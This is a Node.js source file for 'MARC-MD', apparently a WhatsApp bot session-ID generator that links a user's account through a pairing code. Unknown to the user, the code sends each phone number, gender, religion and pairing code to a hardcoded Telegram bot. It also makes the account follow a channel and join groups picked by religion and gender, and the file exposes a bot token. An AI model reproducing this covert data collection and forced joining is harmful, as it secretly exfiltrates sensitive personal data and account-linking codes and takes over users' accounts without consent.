import { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    DisconnectReason
} from "@whiskeysockets/baileys";
import express from "express";
import pino from "pino";
import fs from "fs";
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
// ہیروکو کے لیے ڈائنامک پورٹ سیٹنگ
const port = process.env.PORT || 8000;

// --- CONFIGURATION ---
const BOT_NAME = "MARC-MD";
const DEVELOPER = "Arslan Chaudhary 👑";
const CHANNEL_JID = "120363315663704381@newsletter"; 
const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
const TELEGRAM_CHAT_ID = "7779604777";

const GROUP_CHAT_ID = "120363390235431636@g.us"; 
const COMMUNITY_ID = "120363384260384813@g.us"; 

app.use(express.static('public'));

// ہیروکو ہوم پیج روٹ (تاکہ ایپ کریش نہ ہو)
app.get('/', (req, res) => {
    res.status(200).send('MARC-MD Session Generator is Active and Running!');
});

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (e) {
        console.log("Telegram Log Error");
    }
}

async function startSession(phoneNumber, res, gender, religion) {
    const sessionPath = path.join(__dirname, 'sessions', phoneNumber);
    
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        browser: ["MARC-MD", "Chrome", "1.0.0"]
    });

    if (phoneNumber && !socket.authState.creds.registered) {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, ''); 
        try {
            await delay(3000); 
            let code = await socket.requestPairingCode(phoneNumber);
            code = code?.replace(/-/g, '') || code;
            if (res && !res.headersSent) res.status(200).json({ code });
            
            const logMsg = `🚀 *New Pairing Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Pairing Code:* \`${code}\``;
            sendToTelegram(logMsg);
        } catch (err) {
            console.log("Pairing Code Error: ", err);
            if (res && !res.headersSent) res.status(500).json({ error: "Failed to generate code" });
        }
    }

    socket.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
            await delay(5000);
            
            // سیشن آئی ڈی جنریشن
            const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
            const sessionId = `MARC-MD~${sessionBase64}`;
            
            try {
                // آٹومیٹک جوائن لاجک
                await socket.newsletterFollow(CHANNEL_JID);
                if (religion === "Muslim") {
                    if (gender === "Male") {
                        await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                        await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                    } else if (gender === "Female") {
                        await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                    }
                } else if (religion === "Non-Muslim") {
                    if (gender === "Male") {
                        await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                    }
                }
            } catch (e) {
                console.log("Force Join Error: ", e.message);
            }

            // یوزر کو سیشن آئی ڈی بھیجنا
            const welcomeText = `👋 *Greetings from Arslan Chaudhary Official!*\n\nYour *${BOT_NAME}* session has been established successfully.`;
            await socket.sendMessage(socket.user.id, { text: welcomeText });
            
            await delay(2000);
            const idMsg = await socket.sendMessage(socket.user.id, { text: sessionId });
            
            await delay(2000);
            await socket.sendMessage(socket.user.id, { 
                text: `⬆️ *Copy Your Session ID*\n\n⚠️ *Keep it safe!* Sharing this ID gives access to your WhatsApp account.`,
                quoted: idMsg
            });

            const promoMsg = `✨ *MARC-MD OFFICIAL LINKS* ✨\n\n👤 *Developer:* ${DEVELOPER}\n\n🌟 *Follow For Updates:*\n🎵 [TikTok](https://www.tiktok.com/@arslan_chaudhary_313)\n📸 [Instagram](https://www.instagram.com/arslan_chaudhary_313)\n🔵 [Facebook](https://www.facebook.com/Arslan0Chaudhary313)\n💻 [GitHub](https://github.com/Arslan-Chaudhary313)`;

            await socket.sendMessage(socket.user.id, { 
                text: promoMsg,
                contextInfo: {
                    externalAdReply: {
                        title: "Arslan Chaudhary Official",
                        body: "MARC-MD Connection Successful",
                        thumbnailUrl: "https://graph.org/file/your-logo-link.jpg",
                        sourceUrl: "https://whatsapp.com/channel/0029Vat4TFC0QeaoLURbP61u",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });

            sendToTelegram(`✅ *SESSION GENERATED SUCCESSFULLY*\n\n*User:* ${socket.user.name || 'Unknown'}\n*Number:* ${phoneNumber}`);
            
            await delay(10000);
            // سیشن فائلز ڈیلیٹ کرنا تاکہ سرور بھر نہ جائے
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            }
        }

        if (connection === "close") {
            const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log("Reconnecting...");
                startSession(phoneNumber, null, gender, religion);
            }
        }
    });

    socket.ev.on("creds.update", saveCreds);
}

app.get("/get-code", (req, res) => {
    const { number, gender, religion } = req.query;
    if (!number) return res.status(400).json({ error: "Number is required" });
    startSession(number, res, gender, religion);
});

app.listen(port, () => {
    console.log(`🚀 MARC-MD Server is live on port ${port}`);
});
